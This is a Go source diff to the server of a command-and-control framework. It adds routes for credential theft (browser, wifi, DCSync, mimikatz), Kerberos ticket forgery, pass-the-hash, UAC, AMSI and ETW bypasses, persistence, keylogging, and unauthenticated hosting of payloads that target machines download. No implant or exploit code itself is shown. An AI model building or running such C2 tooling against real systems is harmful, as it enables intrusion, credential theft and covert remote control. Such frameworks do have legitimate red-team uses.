@@ -14,6 +14,7 @@ import (
 	"net/url"
 	"os"
 	"path/filepath"
+	"runtime"
 	"strings"
 	"sync"
 	"time"
@@ -43,9 +44,21 @@ type Server struct {
 	socksEngine  *socksRelayEngine
 	startTime    time.Time
 
-	dnsListener        *DNSBeaconListener
+	dnsListener         *DNSBeaconListener
 	screenMonitorAgents map[string]time.Time
 	screenMonitorMu     sync.Mutex
+
+	// P0-3: rportfwd (reverse port forward)
+	rportfwdListeners map[string]*rportfwdRelay
+	rportfwdMu        sync.Mutex
+
+	trafficLog  *trafficRing
+	updateState updateCheckState
+	collab      *collabState
+
+	// WebSocket hubs
+	wsHub   *WebSocketHub
+	chatHub *ChatHub
 }
 
 func New(cfg *config.Config, database *gorm.DB) *Server {
@@ -60,15 +73,18 @@ func New(cfg *config.Config, database *gorm.DB) *Server {
 	r.Use(middleware.ErrorHandler())
 
 	s := &Server{
-		cfg:                cfg,
-		db:                 database,
-		router:             r,
-		wsClients:          make(map[*websocket.Conn]bool),
-		rateLimiter:        middleware.NewRateLimiter(BeaconRateLimit, BeaconRateWindow),
-		loginLimiter:       middleware.NewRateLimiter(LoginRateLimit, LoginRateWindow),
-		socksEngine:        newSocksRelayEngine(),
-		startTime:          time.Now(),
+		cfg:                 cfg,
+		db:                  database,
+		router:              r,
+		wsClients:           make(map[*websocket.Conn]bool),
+		rateLimiter:         middleware.NewRateLimiter(BeaconRateLimit, BeaconRateWindow),
+		loginLimiter:        middleware.NewRateLimiter(LoginRateLimit, LoginRateWindow),
+		socksEngine:         newSocksRelayEngine(),
+		startTime:           time.Now(),
 		screenMonitorAgents: make(map[string]time.Time),
+		rportfwdListeners:   make(map[string]*rportfwdRelay),
+		trafficLog:          newTrafficRing(),
+		collab:              newCollabState(),
 		wsUpgrader: websocket.Upgrader{
 			ReadBufferSize:  1024,
 			WriteBufferSize: 1024,
@@ -88,6 +104,7 @@ func New(cfg *config.Config, database *gorm.DB) *Server {
 
 	s.setupTemplates()
 	s.setupRoutes()
+	s.loadAgentLocks()
 
 	return s
 }
@@ -184,18 +201,28 @@ func (s *Server) setupRoutes() {
 	// Request logging middleware
 	s.router.Use(middleware.RequestLogger())
 
+	// Static files (no auth required)
+	s.router.Static("/static", "./internal/server/templates/static")
+
 	// Auth with CSRF and login rate limiting
 	s.router.GET("/login", middleware.CSRFProtection(), s.handleLoginPage)
 	s.router.POST("/login", s.loginLimiter.Limit(), middleware.CSRFProtection(), s.handleLogin)
 
-	// Protected routes with CSRF
+	// Health check endpoints (no auth required)
+	s.router.GET("/health", s.handleHealthCheck)
+	s.router.GET("/ready", s.handleHealthCheck)
+
+	// Protected routes
 	auth := s.router.Group("/")
 	auth.Use(middleware.AuthRequired(s.db))
 	auth.Use(s.AuditMiddleware())
+	auth.Use(s.ActivityMiddleware())
 	auth.Use(middleware.CSRFProtection())
 	{
 		auth.GET("/", s.handleDashboard)
 		auth.GET("/dashboard", s.handleDashboard)
+
+		// ── Agent pages (read-only, no lock check) ──────────────────────
 		auth.GET("/agents", s.handleAgents)
 		auth.GET("/agents/:id", s.handleAgentDetail)
 		auth.GET("/agents/:id/shell", s.handleShellPage)
@@ -203,102 +230,198 @@ func (s *Server) setupRoutes() {
 		auth.GET("/agents/:id/screen", s.handleScreenMonitorPage)
 		auth.GET("/agents/:id/tasks", s.handleGetAgentTasks)
 		auth.GET("/agents/:id/tasks/:taskId", s.handleGetTaskStatus)
-		auth.POST("/agents/:id/kill", s.handleKillAgent)
-		auth.POST("/agents/:id/command", s.handleSendCommand)
-		auth.POST("/agents/:id/screenshot", s.handleRequestScreenshot)
-		auth.POST("/agents/:id/screenshot_window", s.handleRequestScreenshotWindow)
-		auth.POST("/agents/:id/ps", s.handleRequestPS)
-		auth.POST("/agents/:id/keylogger/start", s.handleStartKeylogger)
-		auth.POST("/agents/:id/keylogger/stop", s.handleStopKeylogger)
-		auth.POST("/agents/:id/keylogger/dump", s.handleDumpKeylogger)
-		auth.POST("/agents/:id/suspend", s.handleSuspendProcess)
-		auth.POST("/agents/:id/resume", s.handleResumeProcess)
-		auth.POST("/agents/:id/killproc", s.handleKillProcess)
-		auth.POST("/agents/:id/clipboard/get", s.handleClipboardGet)
-		auth.POST("/agents/:id/clipboard/set", s.handleClipboardSet)
-		auth.POST("/agents/:id/find", s.handleFindFiles)
-		auth.POST("/agents/:id/reg/get", s.handleRegGet)
-		auth.POST("/agents/:id/reg/set", s.handleRegSet)
-		auth.POST("/agents/:id/reg/delete", s.handleRegDelete)
-		auth.POST("/agents/:id/reboot", s.handleReboot)
-		auth.POST("/agents/:id/shutdown", s.handleShutdown)
-		auth.POST("/agents/:id/drives", s.handleListDrives)
-		auth.POST("/agents/:id/beacon_now", s.handleBeaconNow)
-		auth.POST("/agents/:id/services", s.handleListServices)
-		auth.POST("/agents/:id/portscan", s.handlePortScan)
-		auth.POST("/agents/:id/netstat", s.handleNetstat)
-		auth.POST("/agents/:id/users", s.handleUsers)
-		auth.POST("/agents/:id/av", s.handleAV)
-		auth.POST("/agents/:id/download_url", s.handleDownloadURL)
-		auth.POST("/agents/:id/uninstall", s.handleUninstall)
-		auth.POST("/agents/:id/set_sleep", s.handleSetSleep)
-		auth.POST("/agents/:id/kill_av", s.handleKillAV)
-		auth.POST("/agents/:id/elevate", s.handleElevate)
-		auth.POST("/agents/:id/elevate/printnightmare", s.handleElevatePrintNightmare)
-		auth.POST("/agents/:id/execute_assembly", s.handleExecuteAssembly)
-		auth.POST("/agents/:id/kerberoast", s.handleKerberoast)
-		auth.POST("/agents/:id/mimikatz", s.handleMimikatz)
-		auth.POST("/agents/:id/bof", s.handleBOF)
-		auth.POST("/agents/:id/creds", s.handleCredsDump)
-		auth.POST("/agents/:id/inject", s.handleInject)
-		auth.POST("/agents/:id/lateral", s.handleLateral)
-		auth.POST("/agents/:id/socks", s.handleSocks)
-		auth.POST("/agents/:id/link", s.handleLinkAgent)
-		auth.POST("/agents/:id/unlink", s.handleUnlinkAgent)
 		auth.GET("/api/agents/unlinked", s.handleListUnlinkedAgents)
-		auth.POST("/agents/:id/download", s.handleDownload)
-		auth.POST("/agents/:id/upload", s.handleUploadFile)
+		auth.GET("/agents/:id/token", s.handleTokenPage)
+		auth.GET("/agents/:id/token/list", s.handleGetTokens)
+
+		// ── Agent operations (note, collab, cancel/rerun, delete — no lock) ─
+		auth.POST("/agents/:id/kill", s.handleKillAgent)
+		auth.POST("/agents/:id/lock", s.handleLockAgent)
+		auth.POST("/agents/:id/unlock", s.handleUnlockAgent)
 		auth.POST("/agents/:id/note", s.handleUpdateNote)
+		auth.POST("/agents/:id/tasks/:taskId/cancel", s.handleCancelTask)
 		auth.POST("/agents/:id/task/:taskId/rerun", s.handleRerunTask)
 		auth.DELETE("/agents/:id", s.handleDeleteAgent)
 		auth.POST("/agents/batch", s.handleBatchCommand)
-		auth.POST("/agents/:id/files/ls", s.handleListDir)
-		auth.POST("/agents/:id/files/delete", s.handleFileDelete)
-		auth.POST("/agents/:id/files/read", s.handleFileRead)
-		auth.POST("/agents/:id/files/upload", s.handleFileUploadFromAgent)
-		auth.POST("/agents/:id/screen/start", s.handleStartScreenMonitor)
-		auth.POST("/agents/:id/screen/stop", s.handleStopScreenMonitor)
+		auth.GET("/agents/:id/socks_relay/status", s.handleSocksRelayStatus)
 
-		// ── Token Impersonation ────────────────────────────────────────────────
-		auth.GET("/agents/:id/token", s.handleTokenPage)
-		auth.GET("/agents/:id/token/list", s.handleGetTokens)
-		auth.POST("/agents/:id/token/list_procs", s.handleTokenListProcs)
-		auth.POST("/agents/:id/token/steal", s.handleTokenSteal)
-		auth.POST("/agents/:id/token/make", s.handleTokenMake)
-		auth.POST("/agents/:id/token/revert", s.handleTokenRevert)
-		auth.POST("/agents/:id/token/whoami", s.handleTokenWhoami)
-		auth.DELETE("/agents/:id/token/:token_id", s.handleTokenDrop)
-		auth.POST("/agents/:id/token/:token_id/impersonate", s.handleTokenImpersonate)
-		auth.POST("/agents/:id/token/:token_id/note", s.handleTokenNoteUpdate)
+		// ── Agent commands (lock check + viewer check) ──────────────────
+		agentCmd := auth.Group("/agents/:id")
+		agentCmd.Use(s.agentCommandMiddleware())
+		{
+			agentCmd.POST("/command", s.handleSendCommand)
+			agentCmd.POST("/screenshot", s.handleRequestScreenshot)
+			agentCmd.POST("/screenshot_window", s.handleRequestScreenshotWindow)
+			agentCmd.POST("/ps", s.handleRequestPS)
+			agentCmd.POST("/keylogger/start", s.handleStartKeylogger)
+			agentCmd.POST("/keylogger/stop", s.handleStopKeylogger)
+			agentCmd.POST("/keylogger/dump", s.handleDumpKeylogger)
+			agentCmd.POST("/suspend", s.handleSuspendProcess)
+			agentCmd.POST("/resume", s.handleResumeProcess)
+			agentCmd.POST("/killproc", s.handleKillProcess)
+			agentCmd.POST("/clipboard/get", s.handleClipboardGet)
+			agentCmd.POST("/clipboard/set", s.handleClipboardSet)
+			agentCmd.POST("/find", s.handleFindFiles)
+			agentCmd.POST("/reg/get", s.handleRegGet)
+			agentCmd.POST("/reg/set", s.handleRegSet)
+			agentCmd.POST("/reg/delete", s.handleRegDelete)
+			agentCmd.POST("/reboot", s.handleReboot)
+			agentCmd.POST("/shutdown", s.handleShutdown)
+			agentCmd.POST("/drives", s.handleListDrives)
+			agentCmd.POST("/beacon_now", s.handleBeaconNow)
+			agentCmd.POST("/services", s.handleListServices)
+			agentCmd.POST("/portscan", s.handlePortScan)
+			agentCmd.POST("/netstat", s.handleNetstat)
+			agentCmd.POST("/users", s.handleUsers)
+			agentCmd.POST("/av", s.handleAV)
+			agentCmd.POST("/download_url", s.handleDownloadURL)
+			agentCmd.POST("/uninstall", s.handleUninstall)
+			agentCmd.POST("/set_sleep", s.handleSetSleep)
+			agentCmd.POST("/kill_av", s.handleKillAV)
+			agentCmd.POST("/elevate", s.handleElevate)
+			agentCmd.POST("/uac_bypass", s.handleUACBypass)
+			agentCmd.POST("/amsi_bypass", s.handleAMSIByPass)
+			agentCmd.POST("/etw_bypass", s.handleETWByPass)
+			agentCmd.POST("/elevate/printnightmare", s.handleElevatePrintNightmare)
+			agentCmd.POST("/execute_assembly", s.handleExecuteAssembly)
+			agentCmd.POST("/kerberoast", s.handleKerberoast)
+			agentCmd.POST("/mimikatz", s.handleMimikatz)
+			agentCmd.POST("/powerpick", s.handlePowerPick)
+			agentCmd.POST("/net", s.handleNetCommand)
+			agentCmd.POST("/persistence", s.handlePersistence)
+			agentCmd.POST("/bof", s.handleBOF)
+			agentCmd.POST("/browser_steal", s.handleBrowserSteal)
+			agentCmd.POST("/creds", s.handleCredsDump)
+			agentCmd.POST("/wifi_creds", s.handleWifiCreds)
+			agentCmd.POST("/privesc_check", s.handlePrivescCheck)
+			agentCmd.POST("/inject", s.handleInject)
+			agentCmd.POST("/spawn", s.handleSpawn)
+			agentCmd.POST("/self_update", s.handleSelfUpdate)
+			agentCmd.POST("/lateral", s.handleLateral)
+			agentCmd.POST("/socks", s.handleSocks)
+
+			// ── P0-1: Reflective PE Loader ─────────────────
+			agentCmd.POST("/peloader", s.handlePELoader)
+
+			// ── P0-2: Execute-Assembly fork&run ────────────
+			agentCmd.POST("/execute_assembly_forkrun", s.handleExecuteAssemblyForkRun)
+
+			// ── P0-3: Reverse Port Forward ─────────────────
+			agentCmd.POST("/rportfwd/start", s.handleRPortFwdRelayStart)
+			agentCmd.POST("/rportfwd/stop", s.handleRPortFwdRelayStop)
+
+			// ── P0-4: Kerberos Attacks ─────────────────────
+			agentCmd.POST("/dcsync", s.handleDCSync)
+			agentCmd.POST("/golden_ticket", s.handleGoldenTicket)
+			agentCmd.POST("/silver_ticket", s.handleSilverTicket)
+			agentCmd.POST("/asreproast", s.handleASREPRoast)
+			agentCmd.POST("/pass_the_hash", s.handlePassTheHash)
+			agentCmd.POST("/pass_the_ticket", s.handlePassTheTicket)
+			agentCmd.POST("/link", s.handleLinkAgent)
+			agentCmd.POST("/unlink", s.handleUnlinkAgent)
+			agentCmd.POST("/download", s.handleDownload)
+			agentCmd.POST("/upload", s.handleUploadFile)
+
+			// ── File browser ──────────────────────────────
+			agentCmd.POST("/files/ls", s.handleListDir)
+			agentCmd.POST("/files/delete", s.handleFileDelete)
+			agentCmd.POST("/files/read", s.handleFileRead)
+			agentCmd.POST("/files/upload", s.handleFileUploadFromAgent)
+
+			// ── Screen monitor ────────────────────────────
+			agentCmd.POST("/screen/start", s.handleStartScreenMonitor)
+			agentCmd.POST("/screen/stop", s.handleStopScreenMonitor)
+
+			// ── Token Impersonation ───────────────────────
+			agentCmd.POST("/token/list_procs", s.handleTokenListProcs)
+			agentCmd.POST("/token/steal", s.handleTokenSteal)
+			agentCmd.POST("/token/make", s.handleTokenMake)
+			agentCmd.POST("/token/revert", s.handleTokenRevert)
+			agentCmd.POST("/token/whoami", s.handleTokenWhoami)
+			agentCmd.DELETE("/token/:token_id", s.handleTokenDrop)
+			agentCmd.POST("/token/:token_id/impersonate", s.handleTokenImpersonate)
+			agentCmd.POST("/token/:token_id/note", s.handleTokenNoteUpdate)
+
+			// ── SOCKS Relay (agent-side) ─────────────────
+			agentCmd.POST("/socks_relay/start", s.handleStartSocksRelay)
+			agentCmd.POST("/socks_relay/stop", s.handleStopSocksRelay)
+		}
+
+		// ── Generate ────────────────────────────────────────────────────
 		auth.GET("/generate", s.handleGeneratePage)
 		auth.POST("/generate/exe", s.handleGenerateEXE)
 		auth.POST("/generate/ps1", s.handleGeneratePS1)
 		auth.POST("/generate/linux", s.handleGenerateLinux)
+		auth.POST("/generate/macos", s.handleGenerateMacOS)
 		auth.POST("/generate/stager", s.handleGenerateStager)
 		auth.POST("/generate/stager_linux", s.handleGenerateStagerLinux)
+		auth.POST("/generate/one-liner", s.handleGenerateOneLiner)
 
-		// Listeners
+		// ── Listeners ───────────────────────────────────────────────────
 		auth.GET("/listeners", s.handleListenersPage)
 		auth.GET("/listeners/:id", s.handleListenerDetail)
 		auth.GET("/api/listeners", s.handleListListeners)
 		auth.POST("/api/listeners", s.handleCreateListener)
 		auth.PUT("/api/listeners/:id", s.handleUpdateListener)
 		auth.DELETE("/api/listeners/:id", s.handleDeleteListener)
+
+		// ── Tasks ───────────────────────────────────────────────────────
 		auth.GET("/tasks", s.handleTaskHistory)
 		auth.GET("/tasks/export", s.handleExportTasks)
 		auth.GET("/tasks/:taskId", s.handleGetTaskStatus)
+
+		// ── Auth ────────────────────────────────────────────────────────
 		auth.POST("/logout", s.handleLogout)
+
+		// ── Credentials ─────────────────────────────────────────────────
 		auth.GET("/credentials", s.handleCredentialsPage)
 		auth.GET("/credentials/export", s.handleExportCredentials)
 		auth.POST("/credentials/add", s.handleAddCredential)
 		auth.DELETE("/credentials/:cred_id", s.handleDeleteCredential)
+
+		// ── Pivoting / Topology / Loot / Search / Scanner ────────────────
 		auth.GET("/pivoting", s.handlePivoting)
 		auth.GET("/topology", s.handleTopologyPage)
 		auth.GET("/api/topology/data", s.handleTopologyData)
 		auth.GET("/loot", s.handleLootPage)
 		auth.GET("/search", s.handleGlobalSearch)
+		auth.GET("/scanner", s.handleScannerPage)
+		auth.POST("/api/scan", s.handleScanTask)
+		auth.GET("/api/scan/results/:taskId", s.handleScanResults)
+		auth.GET("/api/scan/agent/:agentId", s.handleScanResultsByAgent)
+		auth.POST("/api/scan/result", s.handleProcessScanResult)
+		auth.GET("/api/scan/export/:taskId", s.handleExportScanResults)
+		auth.POST("/api/browser/result", s.handleProcessBrowserResult)
+		auth.POST("/api/wifi/result", s.handleProcessWifiResult)
+		auth.POST("/api/lateral/result", s.handleProcessLateralResult)
+		auth.POST("/api/privesc/result", s.handleProcessPrivescResult)
+		auth.GET("/privesc", s.handlePrivescPage)
+		auth.GET("/api/privesc/history/:id", s.handlePrivescHistory)
+
+		// ── Timeline ────────────────────────────────────────────────────
+		auth.GET("/timeline", s.handleTimelinePage)
+		auth.GET("/api/timeline/data", s.handleTimelineData)
+		auth.GET("/api/timeline/export", s.handleTimelineExport)
+
+		// ── Report ──────────────────────────────────────────────────────
+		auth.GET("/report", s.handleReportPage)
+		auth.POST("/api/report/generate", s.handleGenerateReport)
+
+		// ── Lateral Movement ───────────────────────────────────────────
+		auth.GET("/lateral", s.handleLateralPage)
+		auth.GET("/api/lateral/history/:id", s.handleLateralHistory)
+
+		// ── Command Templates ─────────────────────────────────────────
+		auth.GET("/templates", s.handleTemplatesPage)
+		auth.POST("/api/templates", s.handleCreateTemplate)
+		auth.DELETE("/api/templates/:id", s.handleDeleteTemplate)
+		auth.GET("/api/templates/category/:category", s.handleGetTemplatesByCategory)
+
+		// ── Audit ───────────────────────────────────────────────────────
 		auth.GET("/audit", s.handleAuditLogPage)
 		auth.GET("/audit/logs", s.handleGetAuditLogs)
+
+		// ── Settings ────────────────────────────────────────────────────
 		auth.GET("/settings", s.handleSettingsPage)
 		auth.POST("/settings/password", s.handleChangePassword)
 		auth.POST("/settings/agent", s.handleSaveAgentConfig)
@@ -310,39 +433,75 @@ func (s *Server) setupRoutes() {
 		auth.POST("/settings/db/vacuum", s.handleDBVacuum)
 		auth.POST("/settings/db/backup", s.handleBackupDatabase)
 		auth.GET("/settings/config/download", s.handleDownloadConfig)
+
+		// ── WebSocket ───────────────────────────────────────────────────
 		auth.GET("/ws", s.handleWebSocket)
+		auth.GET("/ws/beacon", s.handleWebSocketBeacon)
+		auth.GET("/ws/chat", s.handleWebSocketChat)
+
+		// ── Chat ────────────────────────────────────────────────────────
+		auth.GET("/chat", s.handleChatPage)
+		auth.GET("/api/chat/messages", s.handleGetChatMessages)
+		auth.POST("/api/chat/send", s.handleSendChatMessage)
+		auth.DELETE("/api/chat/:id", s.handleDeleteChatMessage)
+
+		// ── Tokens ──────────────────────────────────────────────────────
 		auth.GET("/tokens", s.handleGlobalTokensPage)
 
-		// ── User Management ────────────────────────────────────────────────
+		// ── User Management ─────────────────────────────────────────────
 		auth.GET("/users", s.handleUsersPage)
 		auth.POST("/users/add", s.handleAddUser)
+		auth.POST("/users/:id/edit", s.handleEditUser)
 		auth.POST("/users/:id/toggle", s.handleToggleUser)
 		auth.POST("/users/:id/password", s.handleSetUserPassword)
+		auth.POST("/users/:id/kick", s.handleKickUser)
+		auth.POST("/users/:id/force-logout", s.handleForceLogoutUser)
 		auth.DELETE("/users/:id", s.handleDeleteUser)
 
-		// ── SOCKS Relay (C2-side tunnel) ─────────────────────────────────────
-		auth.POST("/agents/:id/socks_relay/start", s.handleStartSocksRelay)
-		auth.POST("/agents/:id/socks_relay/stop", s.handleStopSocksRelay)
-		auth.GET("/agents/:id/socks_relay/status", s.handleSocksRelayStatus)
+		// ── SOCKS Sessions ──────────────────────────────────────────────
 		auth.GET("/socks/sessions", s.handleGetSocksSessions)
 	}
 
 	// Agent Beacon API with rate limiting
 	api := s.router.Group("/api/v1")
 	api.Use(s.rateLimiter.Limit())
+	api.Use(s.trafficMiddleware())
 	{
 		api.POST("/beacon", s.handleBeacon)
 		api.POST("/screen_frame", s.handleScreenFrame)
 
 		// Malleable profile support (similar to Cobalt Strike)
 		api.POST("/generate_204", s.handleBeacon)
-		api.POST("/th", s.handleBeacon) // for bing like /th?id=...
+		api.POST("/th", s.handleBeacon)          // for bing like /th?id=...
 		api.GET("/generate_204", s.handleBeacon) // support GET if profile uses
 		api.GET("/th", s.handleBeacon)
 	}
 
+	// Build logs
+	auth.GET("/builds", s.handleBuildLogs)
+
+	// Traffic monitor
+	auth.GET("/traffic", s.handleTrafficPage)
+	auth.GET("/api/traffic", s.handleTrafficData)
+
+	// Multi-User Collaboration
+	auth.GET("/api/collab/locks", s.handleGetLocks)
+	auth.POST("/api/collab/chat", s.handleChatSend)
+	auth.GET("/api/collab/chat", s.handleChatHistory)
+	auth.GET("/api/collab/online", s.handleOnlineUsers)
+	auth.GET("/api/collab/pages", s.handlePagePresence)
+	auth.GET("/api/collab/agent-viewers/:id", s.handleAgentViewers)
+
+	// Version update check & hot-update
+	auth.GET("/api/update-check", s.handleUpdateCheck)
+	auth.GET("/api/update-check/version", s.handleCheckVersion)
+	auth.POST("/api/update-check/hot-update", s.handleHotUpdate)
+
 	// Stage serving for Artifact Kit (no auth — stagers are unauthenticated)
 	s.router.GET("/stage/:xorKey", s.handleServeStage)
+
+	// One-Liner payload hosting (no auth — target machines download these)
+	s.router.GET("/payloads/:id/:filename", s.handleServePayload)
 
 	// Screenshot serving (protected)
 	s.router.GET("/screenshots/:agent_id/:filename", middleware.AuthRequired(s.db), s.handleServeScreenshot)
@@ -362,19 +521,23 @@ func (s *Server) handleWebSocket(c *gin.Context) {
 		return nil
 	})
 
-	s.wsMutex.Lock()
-	s.wsClients[conn] = true
-	s.wsMutex.Unlock()
+	// Extract user identity from context (set by AuthRequired middleware)
+	user, _ := c.Get("user")
+	username := fmt.Sprintf("%v", user)
+	userID, _ := c.Get("user_id")
+	uid, _ := userID.(uint)
+	role, _ := c.Get("user_role")
+	roleStr := fmt.Sprintf("%v", role)
 
-	slog.Info("WebSocket client connected")
+	s.addWSConn(conn, uid, username, roleStr)
+
+	slog.Info("WebSocket client connected", "user", username)
 
 	go func() {
 		defer func() {
-			s.wsMutex.Lock()
-			delete(s.wsClients, conn)
-			s.wsMutex.Unlock()
+			s.removeWSConn(conn)
 			conn.Close()
-			slog.Info("WebSocket client disconnected")
+			slog.Info("WebSocket client disconnected", "user", username)
 		}()
 
 		ticker := time.NewTicker(30 * time.Second)
@@ -389,9 +552,15 @@ func (s *Server) handleWebSocket(c *gin.Context) {
 				}
 			default:
 				conn.SetReadDeadline(time.Now().Add(60 * time.Second))
-				_, _, err := conn.ReadMessage()
+				msgType, msgBytes, err := conn.ReadMessage()
 				if err != nil {
 					return
+				}
+				if msgType == websocket.TextMessage && len(msgBytes) > 0 {
+					var msgData map[string]interface{}
+					if err := json.Unmarshal(msgBytes, &msgData); err == nil {
+						s.handleWSMessage(conn, msgData)
+					}
 				}
 			}
 		}
@@ -440,12 +609,13 @@ func (s *Server) broadcastAgentNotification(agent db.Agent) {
 // broadcastTaskUpdate pushes task status (and result if completed) to WS clients
 func (s *Server) broadcastTaskUpdate(agentID string, task db.Task) {
 	payload := map[string]interface{}{
-		"type":     "task_update",
-		"agent_id": agentID,
-		"task_id":  task.ID,
-		"task_type": task.Type,
-		"status":   task.Status,
-		"command":  task.Command,
+		"type":       "task_update",
+		"agent_id":   agentID,
+		"task_id":    task.ID,
+		"task_type":  task.Type,
+		"status":     task.Status,
+		"command":    task.Command,
+		"created_by": task.CreatedBy,
 	}
 	if task.Result != "" {
 		payload["result"] = truncateString(task.Result, 200)
@@ -541,6 +711,18 @@ func (s *Server) Run() error {
 	// start periodic cleanup
 	go s.runPeriodicCleanup()
 	go s.cleanupStaleSocks()
+	go s.periodicRPortFwdCleanup()
+
+	// start update checker
+	s.initUpdateChecker()
+
+	// periodic cleanup of hosted one-liner payloads
+	go func() {
+		for {
+			time.Sleep(30 * time.Minute)
+			s.cleanupOldPayloads()
+		}
+	}()
 
 	// Start TCP transport layer if enabled (high priority feature)
 	if s.cfg.Server.TCPEnabled && s.cfg.Server.TCPAddr != "" {
@@ -576,9 +758,12 @@ func (s *Server) Run() error {
 			MinVersion: tls.VersionTLS12,
 		}
 		server := &http.Server{
-			Addr:      addr,
-			Handler:   s.router,
-			TLSConfig: tlsCfg,
+			Addr:         addr,
+			Handler:      s.router,
+			TLSConfig:    tlsCfg,
+			ReadTimeout:  30 * time.Second,  // Prevent slow client attacks
+			WriteTimeout: 60 * time.Second,  // Prevent slow response attacks
+			IdleTimeout:  120 * time.Second, // Keep-alive connections
 		}
 		return server.ListenAndServeTLS(certPath, keyPath)
 	}
@@ -590,6 +775,13 @@ func (s *Server) runPeriodicCleanup() {
 	ticker := time.NewTicker(24 * time.Hour)
 	for range ticker.C {
 		s.cleanupOldData()
+	}
+}
+
+func (s *Server) periodicRPortFwdCleanup() {
+	for {
+		time.Sleep(5 * time.Minute)
+		s.cleanupStaleRPortFwd()
 	}
 }
 
@@ -653,6 +845,36 @@ func (s *Server) handleTCPConnection(conn net.Conn) {
 	}
 }
 
+// ActivityMiddleware updates user's LastActivity timestamp on each request (throttled to 60s)
+func (s *Server) ActivityMiddleware() gin.HandlerFunc {
+	var mu sync.Mutex
+	lastUpdated := make(map[uint]time.Time)
+	return func(c *gin.Context) {
+		userID, exists := c.Get("user_id")
+		if !exists {
+			c.Next()
+			return
+		}
+		uid, ok := userID.(uint)
+		if !ok {
+			c.Next()
+			return
+		}
+		now := time.Now()
+		mu.Lock()
+		last := lastUpdated[uid]
+		if now.Sub(last) < 60*time.Second {
+			mu.Unlock()
+			c.Next()
+			return
+		}
+		lastUpdated[uid] = now
+		mu.Unlock()
+		go s.db.Model(&db.User{}).Where("id = ?", uid).Update("last_activity", now)
+		c.Next()
+	}
+}
+
 // getAgentOrFail fetches agent by ID. On failure writes JSON 404 and returns false.
 func (s *Server) getAgentOrFail(c *gin.Context, id string) (db.Agent, bool) {
 	var agent db.Agent
@@ -684,8 +906,25 @@ func (s *Server) createTask(agentID, taskType, command, shell, path, data string
 }
 
 // dispatchTask logs the audit action, broadcasts the update via WS, and returns success JSON.
+// Sets CreatedBy from the authenticated user in context.
 func (s *Server) dispatchTask(c *gin.Context, task *db.Task, auditAction, details string) {
+	// Set task attribution from context
+	user, _ := c.Get("user")
+	if username, ok := user.(string); ok && username != "" && task.CreatedBy == "" {
+		task.CreatedBy = username
+		s.db.Model(task).Update("created_by", username)
+	}
 	s.LogAuditRecord(c, auditAction, "agent", task.AgentID, details, true, nil)
 	s.broadcastTaskUpdate(task.AgentID, *task)
 	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID})
+}
+
+// handleHealthCheck provides health/ready endpoints for monitoring
+func (s *Server) handleHealthCheck(c *gin.Context) {
+	c.JSON(http.StatusOK, gin.H{
+		"status":    "ok",
+		"version":   ServerVersion,
+		"uptime":    time.Since(s.startTime).String(),
+		"goroutine": runtime.NumGoroutine(),
+	})
 }
